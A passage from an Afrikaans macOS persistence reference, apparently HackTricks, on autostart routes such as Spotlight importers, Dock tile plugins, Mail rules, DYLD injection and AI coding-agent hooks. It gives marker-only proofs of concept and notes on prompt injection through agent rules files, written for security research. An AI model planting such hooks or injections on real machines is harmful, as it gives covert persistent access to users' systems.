Die inproppe of **`.mdimporter`**-bundels is op die plekke hierbo genoem. ’n Nuwe bundel moet ontdek word en met ’n lêertipe ooreenstem, en Spotlight moet ’n ooreenstemmende lêer werklik indekseer; die blote kopiëring van ’n bundel bewys nie dat dit gelaai is nie. [Apple se MDImporter-verwysing](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) verbind laai met ’n geskikte lêer wat verander het. Die uitvoering van Spotlight-importers op macOS 26 is nie hier getoets nie.

Dit is moontlik om **al die `mdimporters`** te vind wat tans loop:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Byvoorbeeld, **/Library/Spotlight/iBooksAuthor.mdimporter** word gebruik om hierdie tipe lêers te ontleed (onder andere lêers met die uitbreidings `.iba` en `.book`):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> As jy die Plist van ander `mdimporter` nagaan, sal jy dalk nie die inskrywing **`UTTypeConformsTo`** vind nie. Dit is omdat dit 'n ingeboude _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) is en nie uitbreidings hoef te spesifiseer nie.
>
> Boonop geniet stelsel se verstekplugins altyd voorkeur, dus kan 'n aanvaller slegs toegang kry tot lêers wat nie andersins deur Apple se eie `mdimporters` geïndekseer word nie.

Om jou eie importer te skep, kan jy met hierdie projek begin: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) en dan die naam en **`CFBundleDocumentTypes`** verander, en **`UTImportedTypeDeclarations`** byvoeg sodat dit die uitbreiding ondersteun wat jy wil ondersteun, en dit in **`schema.xml`** weerspieël.\
Verander dan die kode van die funksie **`GetMetadataForFile`** om jou payload uit te voer wanneer 'n lêer met die verwerkte uitbreiding geskep word.

Laastens, **bou en kopieer jou nuwe `.mdimporter`** na een van die drie vorige liggings. Jy kan nagaan of dit gelaai is deur die logs te **monitor** of **`mdimport -L`** uit te voer.

> [!TIP]
> Alhoewel die importer-sandbox baie beperkend is, indekseer `mdworker` lêers met **bevoorregte leestoegang**. 'n Kwaadwillige `.mdimporter` kan dus die *inhoud* van lêers in TCC-beskermde liggings (Downloads, Pictures, Desktop, …) lees en ingesamelde metadata eksfiltreer sonder enige TCC-aanvraag — die **"Sploitlight" TCC-bypass (CVE-2025-31199)**, reggestel in macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

Vir die afsonderlike macOS 26-tegniek om beskermde grepe in **Darwin notification names** te dra eerder as stelsellogs, sien [Spotlight importer leakage via Darwin notification names](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Preference Pane~~

> [!CAUTION]
> Dit lyk nie of dit meer werk nie.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Nuttig om sandbox te omseil: [🟠](https://emojipedia.org/large-orange-circle)
  - Dit vereis 'n spesifieke gebruikerhandeling
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beskrywing

Dit lyk nie of dit meer werk nie.<sup>[[26]](#references)</sup>

### Application Script Files

Writeup: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar jy moet die geteikende toepassing geïnstalleer hê, en die slagoffer moet dit laat loop/gebruik
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

'n **Geïnterpreteerde script wat 'n geïnstalleerde toepassing of nutsprogram werklik uitvoer** en wat die akteur kan wysig. Bevestig die lêer se toestemmings en die oproeppad; dit is nie genoeg om bloot 'n `.sh`- of `.py`-lêer te vind nie. Apple se [code-signing guide](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) sê dat hulpbronne in ondertekende app-bundels, insluitend scripts, verseël word. As 'n script binne die bundel gewysig word, word dié seël verbreek, en dit kan opgespoor of geblokkeer word wanneer die bundel gevalideer word. 'n Eksterne script soos Homebrew se launcher het ander ondertekenings- en vertrouensgedrag. Historiese voorbeelde uit die writeup sluit in:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – 'n script wat deur ouer Sublime Text-weergawes gebruik is; die lêer en die gebruik daarvan tydens opstart moet vir die geïnstalleerde weergawe nagegaan word. Dit was afwesig op die toets-Mac.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) of **`/usr/local/bin/brew`** (Intel) – 'n Bash-launcher wat uitgevoer word wanneer daardie `brew`-pad gebruik word, indien dit geïnstalleer is en die akteur skryftoegang het. `/opt/homebrew/bin/brew` was 'n skryfbare Bash-script op die toets-Mac; dit is 'n plaaslike waarneming, nie 'n algemene Homebrew-toestemmingsreël nie.
- **IDLE se `idlemain.py`** binne 'n Python-app-bundel – skryftoegang mag admin-toestemming vereis, maar dit loop met die IDLE-gebruiker se identiteit.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – 'n historiese shell-script wat as root loop wanneer die ooreenstemmende `org.wireshark.ChmodBPF` launchd-taak geïnstalleer is. Die script en taak was afwesig op die toets-Mac.

#### Beskrywing & Uitbuiting

Sommige nutsprogramme en apps voer geïnterpreteerde scripts tydens looptyd uit. 'n Skryfbare script kan bygevoegde opdragte uitvoer wanneer die spesifieke oproeper dit volgende keer laat loop, mits handtekeningvalidering, quarantaine en ander kontroles dit toelaat. Die oorspronklike navorsing het verskeie installasies uit 2019 gedemonstreer; gaan hul paaie en snellers weer na op die teikenweergawe.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Hierdie kopietoets het `marker fired: True` op macOS 26.5.2 opgelewer; die oorspronklike launcher is onaangeraak gelaat. Dit bewys dat die invoegpunt in die kopie uitgevoer word, nie dat ’n gewysigde, ondertekende app-bundel of ’n werklike Homebrew-installasie elke lanseringskontrole sal slaag nie.

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Vereis dat ’n app wat die plug-in verklaar, opgespoor/geregistreer en deur die Dock verwerk word
  - Die plugin word in ’n **Apple-ondertekende** helper gelaai wat geen app-sandbox-entitlement het nie en **library validation gedeaktiveer** het. Hierdie helper is nie in die Background Task Management UI in die aangehaalde navorsing gewys nie; sigbaarheid op ’n teikenweergawe moet nagegaan word.
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, waarna verwys word met die **`NSDockTilePlugIn`**-sleutel in die app se `Info.plist`; die plugin se eie `Info.plist` stel **`NSPrincipalClass`** in.

#### Beskrywing & Exploitation

Wanneer ’n app `NSDockTilePlugIn` verklaar, kan die Dock die verwysde bundel in die **`com.apple.dock.external.extra`** XPC-helper (`...extra.arm64` op Apple Silicon) laai wanneer jy aanmeld of wanneer die teël bygevoeg word; die app self hoef nie te begin nie. Dit vereis dat die app deur macOS opgespoor/geregistreer en aanvaar word. Die helper is **Apple-onderteken**, het geen `com.apple.security.app-sandbox`-entitlement nie en het `com.apple.security.cs.disable-library-validation`. Die hoofklas se **`setDockTile:`**-metode word tydens laai aangeroep; van daar af kan dit op verspreide kennisgewings inteken (bv. `com.apple.screenIsLocked`) om latere gebeurtenisse te ontvang.<sup>[[38]](#references)</sup>

Op macOS 26.5.2 het leesalleen-`codesign`-inspeksie die helper se Apple-handtekening en entitlements bevestig, en verskeie geïnstalleerde apps het `NSDockTilePlugIn` verklaar. Geen nuwe plug-in is op daardie Mac geïnstalleer of gelaai nie, dus is die uitvoering van ’n nuutgeskrewe bundel op daardie weergawe steeds ongetoets.

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### Widgets (Notification Center / WidgetKit)

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Die widget-uitbreiding loop in sy **eie proses**, en om een by te voeg, veroorsaak **nie** ’n Background Task Management-waarskuwing nie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Die config plist lê binne ’n TCC-beskermde container, dus vereis wysiging daarvan van buite Full Disk Access of ’n TCC bypass

#### Ligging

- Widget-uitbreidingsbundel: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- Aktiewe/geregistreerde widgets: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`** (sleutels `widgets.instances` en `widgets.widgets`)

#### Beskrywing & Uitbuiting

’n WidgetKit-uitbreiding wat saam met ’n app verskeep word, loop in **sy eie proses** wat deur Notification Center bestuur word. Deur ’n instansie in `widgets.instances` te registreer (’n base64 `NSKeyedArchiver`-gekodeerde `CHSWidget`-blob met ingebedde `INIntent`-data) en NotificationCenter te herbegin, laai die widget en voer dit sy `TimelineProvider`-/intent-kode uit.<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app-reëls (Run AppleScript)

Skrywe: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Maar Mail.app moet met ’n rekening opgestel wees en loop; die sneller is ’n inkomende e-pos
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)
  - Om die reëls/scripts van buite Mail af te wysig, kan vereis dat Mail gesluit is en dat Full Disk Access op moderne macOS geaktiveer is

#### Ligging

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`** (plaaslike reëls; `V10` op Sonoma/Sequoia, `V11`+ op nuwer weergawes)
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`** (iCloud-gesinkroniseerde reëls; geniet voorrang)
- Reëlaktivering: **`RulesActiveState.plist`**; AppleScript-loongreep: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### Beskrywing en uitbuiting

’n Apple Mail-**reël** kan ’n *"Run AppleScript"*-aksie hê. Deur ’n reël by te voeg wat met ’n vervaardigde **onderwerpreël** ooreenstem en ’n aanvallerskrip uitvoer, kry die aanvaller **afstandbeheerbare, onopvallende** kode-uitvoering binne Mail se konteks wanneer die spesiale e-pos aankom — ’n vektor wat baie volhardingskandeerders ontduik, omdat geen LaunchAgent/Login Item geskep word nie.<sup>[[42]](#references)</sup> As die reël ook ingestel word om die snellere-pos te **verwyder**, word die bewyse versteek. Verdedigers kan direk daarna soek:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

Beskrywing: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle)
  - Moderne macOS vereis **handmatige gebruikergoedkeuring** in System Settings → *Device Management* (stille `profiles install` is buite MDM nie meer beskikbaar nie)
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Geïnstalleerde profiele is onder **`/Library/Managed Preferences/`** en **`/var/db/ConfigurationProfiles/`**; ’n profiel is ’n XML-plist met ’n `PayloadContent`-skikking.

#### Beskrywing & Uitbuiting

’n `.mobileconfig` is nie ’n primitief vir direkte kode-uitvoering nie, maar dit kan konfigurasie volhou, soos ’n **vertroude wortel-CA** (`com.apple.security.root`), ’n **globale of PAC-instaanbediener** (`com.apple.proxy.*`), **bestuurde voorkeure** (`com.apple.ManagedClient.preferences`), of beperkings. Op macOS 10.15 en later bepaal Apple se [`PayloadRemovalDisallowed`-definisie](https://developer.apple.com/documentation/devicemanagement/toplevel) dat die instelling daarvan op `true` in ’n **handmatig geïnstalleerde** profiel sonder ’n verwyderingswagwoordpayload **administrateurstawing** vereis om dit te verwyder; dit maak die profiel nie absoluut onverwyderbaar nie. MDM-geïnstalleerde profiele het afsonderlike bestuurs- en verwyderingsreëls.<sup>[[44]](#references)</sup>

> [!WARNING]
> ’n Gewone konfigurasieprofiel het **geen payload-tipe wat ’n arbitrêre `LaunchDaemon`/`LaunchAgent` installeer nie**. Om ’n daemon só te installeer, vereis volle **MDM-inskrywing** plus ’n bestuursagent/-skrip — moenie `.mobileconfig` as ’n afleweringsmeganisme vir launchd beskou nie.

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES-volharding

- Nuttig om sandbox te omseil: [🔴](https://emojipedia.org/large-red-circle)
  - dyld **stroop** `DYLD_*` van SIP-/platform-binaries, hardened-runtime-programme en setuid-teikens af, dus dit spuit slegs in onbeskermde prosesse in en omseil **nie** SIP/die hardened runtime nie
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- Betroubare vorm: die **`EnvironmentVariables`**-dict binne ’n kwaadwillige `LaunchAgent`/`LaunchDaemon`-plist (loop by aanmelding/wanneer die stelsel selflaai)
- Verouderd/histories (slegs vir verslagdoening): **`~/.MacOSX/environment.plist`** (verwyder in 10.8) en **`/etc/launchd.conf`** (verwyder in 10.10)

#### Beskrywing en uitbuiting

As ’n aanvaller `DYLD_INSERT_LIBRARIES` in ’n slagofferproses se omgewing kan plaas, laai dyld die aanvaller se dylib (die konstruktor daarvan loop) in daardie proses. Die volhardende variant sluit die veranderlike in ’n LaunchAgent in, sodat elke keer wanneer die taak begin, dit weer inspuit. Let daarop dat `launchctl setenv DYLD_*` op moderne macOS gefiltreer word, dus sluit dit eerder in die plist in.<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

Vir die volledige meganika van dylib-injection/hijacking, sien:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent-CLI's (hooks, MCP-bedieners, reëlêers)

Verslae: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
  - Vereis dat die ontwikkelaar die betrokke agent gebruik. Opdragte wat tydens opstart uitgevoer word, gebruik daardie gebruiker se voorregte wanneer die agent hul konfigurasie aanvaar; vertroue in die werkruimte en MCP-goedkeuring verskil volgens produk en sessiemodus.
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle) (loop as die gebruiker; erf alles waartoe die terminale/agent reeds toegang het)

#### Ligging

Die eksplisiete hook- en MCP-konfigurasielêers kan **shell-opdragte of kinderprosesse laat loop wanneer die ontwikkelaar die hulpmiddel gebruik** — hetsy vanuit 'n globale lêer per gebruiker (volharding) of vanuit 'n lêer wat in 'n repo vasgelê is (voorsieningsketting). `CLAUDE.md`, `AGENTS.md`, `GEMINI.md` en redigeerderreëls is **instruksies aan 'n agent**, en waarborg nie dat shell-opdragte uitgevoer word wanneer die lêer gelees word nie; die uitwerking daarvan hang af van die agent se gedrag en hulpmiddeltoestemmings. Gaan die huidige vertrouens- en goedkeuringsreëls vir elke produk na.

- **Claude Code**
  - `~/.claude/settings.json`, projeklêer `.claude/settings.json`, `.claude/settings.local.json` en die lêer **`/Library/Application Support/ClaudeCode/managed-settings.json`**, wat slegs deur root bestuur word (MDM/bestuurde instellings **kan nie deur die gebruiker oorskryf word nie** → sterk volharding)
  - `hooks`-objek — gebeure `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStop`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact` — elkeen voer 'n shell-`command` uit
  - `statusLine.command` — 'n shell-opdrag wat uitgevoer word om die statuslyn weer te gee (elke sessie)
  - MCP-bedieners in `~/.claude.json` / projeklêer `.mcp.json` — `command`+`args` word as kinderprosesse geloods
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — instruksies wat prompt injection kan probeer, onderhewig aan agentgedrag en hulpmiddeltoestemmings
- **OpenAI Codex CLI**: `~/.codex/config.toml` `[mcp_servers.*]` (`command`/`args` word as kinderprosesse geloods); `AGENTS.md`-projekinstruksies
- **Gemini CLI**: `~/.gemini/settings.json` (`hooks`, MCP-bedieners); `GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json` (`beforeShellExecution`, `afterAgentResponse`, `stop`, … voer opdragte uit); `.cursor/rules/`, `.cursorrules`, `~/.cursor/mcp.json`; GitHub Copilot `.github/copilot-instructions.md`

#### Beskrywing & Uitbuiting

As 'n akteur die rekening se globale gebruikerinstellings kan wysig, kan die hook- of MCP-opdragte daarvan in toekomstige sessies onder daardie rekening loop. 'n Konfigurasie wat deur 'n repo beheer word, is 'n afsonderlike geval: [huidige Claude Code-sekuriteitsdokumentasie](https://code.claude.com/docs/en/security) beskryf 'n interaktiewe dialoogvenster vir vertroue in die werkruimte en 'n aparte goedkeuringsversoek vir projekbedieners in `.mcp.json`. [Die toestemmingsmatriks](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder) sê dat hooks kan loop nadat 'n ouerlêergids vertrou is, en dat `claude -p`/SDK-sessies nie die interaktiewe vertrouensversoek wys nie; projek-MCP-bedieners koppel in daardie nie-interaktiewe modusse sonder 'n goedkeuringsversoek. Die omseiling van projek-hooks vóór vertroue wat as CVE-2025-59536 gerapporteer is, is [in 2025 reggestel](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/); moenie dit as huidige verstekgedrag beskou nie. Afleweringsvektore kan 'n gekompromitteerde repo of 'n kwaadwillige installeerder insluit. Prompt injection via reëlêers is minder voorspelbaar as 'n eksplisiete hook en hang steeds af van hulpmiddelgoedkeurings.<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Voorbeeld van globale gebruikerinstellings vir Claude Code; plaas dit slegs in 'n weggooibare rekening wanneer jy toets:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

Voorbeeld van globale Codex MCP-konfigurasie vir gebruikers:

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Voorbeeld van Cursor-hookkonfigurasie; kontroleer die skema van die geïnstalleerde weergawe voordat jy dit gebruik:

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Blaaieruitbreidings (Chromium: Chrome / Brave / Edge)

Skrywe: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>, [ExtensionInstallForcelist abuse on macOS](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Vereis ’n ondersteunde blaaier en ’n geïnstalleerde, geaktiveerde uitbreiding. External Extensions op macOS vereis bevestiging deur ’n gebruiker; managed force-install vereis ’n toepaslike ondernemingsbeleid.
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> Dit verskil van **native messaging hosts** (sien die *Chrome native messaging hosts*-afdeling hierbo). Hier is die volharding die **outomaties geïnstalleerde uitbreiding** self.

#### Ligging

- **External Extensions JSON** (word tydens die blaaier se opstart ontdek, en vereis daarna ’n aktiveringsversoek op macOS):
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json` (per gebruiker) of `/Library/Application Support/Google/Chrome/External Extensions/` (alle gebruikers)
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- **Enterprise-policy force-install** via managed preferences / ’n configuration profile:
  - `com.google.Chrome`-sleutel `ExtensionInstallForcelist` (Brave `com.brave.Browser`, Edge `com.microsoft.Edge`), gelees vanaf `/Library/Managed Preferences/` of ’n geïnstalleerde `.mobileconfig`

#### Beskrywing en uitbuiting

Dit is twee verskillende installasieroetes. Chrome se [external-install-dokumentasie](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) sê **Windows- en macOS-gebruikers moet ’n uitbreiding wat via ’n *External Extensions*-lêer aangebied word, bevestig en aktiveer**; dit word nie uitgevoer bloot omdat daardie JSON-lêer geskryf is nie. Vir installasie vir alle gebruikers op macOS vereis Chrome ook dat die external-extension-lêer beskerm word teen wysiging deur onbevoorregte gebruikers. ’n Managed `ExtensionInstallForcelist`- of `ExtensionSettings`-beleid kan ’n uitbreiding installeer en vaspen sonder daardie interaksie met die gebruiker; [Google se Mac-beleidsgids](https://support.google.com/chrome/a/answer/7517624) beskryf die managed configuration en sê dat die gebruiker nie force-installed-uitbreidings kan verwyder nie. Dit is ’n beleidsontplooiingsroete, nie ’n `defaults write`-kortpad per gebruiker nie.<sup>[[49]](#references)</sup>

> [!WARNING]
> Op macOS moet ’n *External Extensions*-JSON-manifest na ’n **Chrome Web Store**-opdaterings-URL verwys, nie na ’n plaaslike CRX nie. Managed policy deployment het sy eie ondernemingsvoorvereistes en kan ’n managed, selfgehuisveste opdaterings-URL toelaat. Vir ’n plaaslike, uitgepakte uitbreiding in ’n toetsprofiel is Chrome se developer-mode-`--load-extension=/path`-skakelaar ’n afsonderlike meganisme; dit maak nie ’n External Extensions JSON-lêer selfuitvoerend nie. Moenie ’n skryfbewerking na `Secure Preferences` gelykstel aan enige van die twee gedokumenteerde registrasieroetes nie.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Begin Chrome in daardie weggooibare rekening en let op die aktiveringsversoek; die uitbreiding se eie gedrag is die uitvoerings-PoC sodra die gebruiker dit aanvaar. Verwyder ná die toets die manifest en deaktiveer/installeer die uitbreiding in daardie profiel. Hierdie pad is **nie** in die aktiewe Chrome-profiel op die navorsings-Mac getoets nie. Die roete via bestuurde beleid is ook nie daar ontplooi nie.

Force-install en External Extensions verwys na uitbreiding-ID's van die **Chrome Web Store**; sien die volgende vir die laervlak-truuk om stilweg 'n plaaslike uitbreiding in te spuit deur die profiel se HMAC-ondertekende `Secure Preferences` te wysig, en vir ander misbruik van Chromium-prosesse:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL-skema- en lêertipe-hanteerders (LaunchServices)

Skrywe: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Nuttig om sandbox te omseil: [✅](https://emojipedia.org/check-mark-button)
  - Die sneller is wanneer die slagoffer op 'n skakel klik (bv. in Chrome/Brave/Safari) of 'n lêer van die geregistreerde tipe oopmaak
- TCC-omseiling: [🔴](https://emojipedia.org/large-red-circle)

#### Ligging

- 'n Toepassingsbundel se `Info.plist` wat **`CFBundleURLTypes`/`CFBundleURLSchemes`** (pasgemaakte URL-skema) of **`CFBundleDocumentTypes`** (lêeruitbreiding/UTI) verklaar
- Effektiewe verstekwaardes per gebruiker kan in **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** voorkom (`LSHandlers`-skikking). Apple se ondersteunde API om 'n verstek vir 'n URL-skema te kies, is `LSSetDefaultHandlerForURLScheme`; om daardie plist direk te skryf, is nie 'n gedokumenteerde registrasie- of kasbywerkingsmetode nie.

#### Beskrywing en uitbuiting

Launch Services verkry aansprake oor URL-skemas en dokumente uit 'n geregistreerde toepassing se `Info.plist`. [Apple se registrasiegids](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) sê registrasie kan plaasvind wanneer Finder die toepassing ontdek, tydens selflaai of aanmelding, of via 'n eksplisiete registrasie-API; om bloot 'n toepassing êrens neer te skryf, waarborg nie dat dit onmiddellik geaktiveer word nie. Ná registrasie kan die opening van 'n ooreenstemmende URL of dokument die gekose hanteerder-toepassing begin, onderhewig aan die gebruiker se keuse van verstekhanteerder en normale macOS-beginkontroles. Die ondersteunde `LSSetDefaultHandlerForURLScheme`-API verander 'n gebruiker se voorkeurlêerhanteerder; dit laat nie 'n nuut neergeplaaste toepassing outomaties uitvoer nie.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Geen app is geregistreer nie en geen handler-voorkeur is op die macOS 26.5.2-navorsings-Mac verander nie. Om ’n werklike handler te toets, gebruik ’n weggooibare gebruikersrekening, registreer ’n app wat net ’n merker skryf en ’n unieke skema gebruik, roep die URL aan, en verwyder dan die app en sy registrasie.

Vir ’n diepgaande bespreking van die opsomming/abusing van lêeruitbreiding- en URL-scheme-handlers, sien:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

<a id="python-startup-files-pth--usercustomize--sitecustomize"></a>

### Python-opstartlêers (`.pth` / `.start` / `usercustomize` / `sitecustomize`)

Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Nuttig om sandbox te bypass: [✅](https://emojipedia.org/check-mark-button)
